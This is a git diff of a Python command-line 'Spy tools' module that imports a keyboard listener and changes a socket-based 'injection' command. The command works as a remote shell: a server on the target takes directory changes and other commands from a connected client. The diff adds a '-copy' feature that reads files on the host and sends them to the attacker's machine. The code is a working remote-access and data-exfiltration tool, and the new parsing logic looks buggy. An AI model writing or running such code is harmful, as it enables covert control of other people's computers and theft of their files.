@@ -1,11 +1,11 @@
-import click
 import os
+import click
+import shutil
+import socket
+import pyaes as pya
+from datetime import datetime
 from pynput.keyboard import Listener
 from lash.Exportables.ikeyboard import *
-import pyaes as pya
-import socket
-from datetime import datetime
-import logging as log
 
 
 @click.group('spy', help='Spy tools')
@@ -111,9 +111,15 @@ def injection(h, c):
                 while conn:
                     conn.sendall(bytes(os.getcwd(), 'utf-8'))
                     data = conn.recv(buffer).decode('utf-8')
-                    if data[0:6].strip() == '-chdir':
-                        os.chdir(data[7:])
+                    if data.strip().split()[0] == '-chdir':
+                        os.chdir(data.strip().split()[1])
                         conn.send(bytes(os.getcwd(), 'utf-8'))
+                    elif data.strip().split()[0] == '-copy':
+                        file_name = ' '.join(data.strip().split()[len(data[0]):])
+                        with open(file_name, 'r') as file:
+                            content = file.read()
+                        conn.send(bytes(file_name, 'utf-8'))
+                        conn.send(bytes(content, 'utf-8'))
                     elif data == '-quit':
                         quit(0)
                     else:
@@ -137,16 +143,28 @@ def injection(h, c):
             print('\nConnected successfully, remote injection is now active')
             print('You need to use the custom commands instead the system defaults\n')
             print(f'{"-"*24}   Custom commands   {"-"*24}')
-            print('[-chdir path]                 Change the the remote directory')
-            print('[-start x]                    Start something on host ')
-            print('[-quit]                       Kill server')
-            print('[-copy path_host path_local]  Copy a file from host to your machine')
-            print('[-move path_local path_host]  Move a file from your machine to host')
+            print('[-chdir path]          Change the the remote directory')
+            print('[-start x]             Start something on host ')
+            print('[-quit]                Kill server')
+            print('[-copy path_host]      Copy a file from host to your machine')
+            print('[-move path_local]     Move a file from your machine to host')
+            print('Move/Copy, gonna affect the local directory (host or client) ')
             print('\nCaution! if you send a incorrect command, the connection will be lost\n')
             while True:
                 path = s.recv(buffer).decode('utf-8')
                 command = str(input(f'{host}/{path}>>> '))
-                s.sendall(bytes(command, 'utf-8'))
-                print(s.recv(buffer).decode('utf-8'))
+                if command.split()[0] == '-copy':
+                    s.sendall(bytes(command, 'utf-8'))
+                    file_name = s.recv(buffer).decode('utf-8')
+                    file_data = s.recv(buffer).decode('utf-8')
+                    with open(file_name, 'w') as file:
+                        file.write(file_data)
+                    print(f'{file_name} has been copied to {os.getcwd()}')
+                elif command.split()[0] == '-quit':
+                    s.sendall(bytes(command, 'utf-8'))
+                    quit(0)
+                else:
+                    s.sendall(bytes(command, 'utf-8'))
+                    print(s.recv(buffer).decode('utf-8'))
     else:
         print('Error: No option passed')
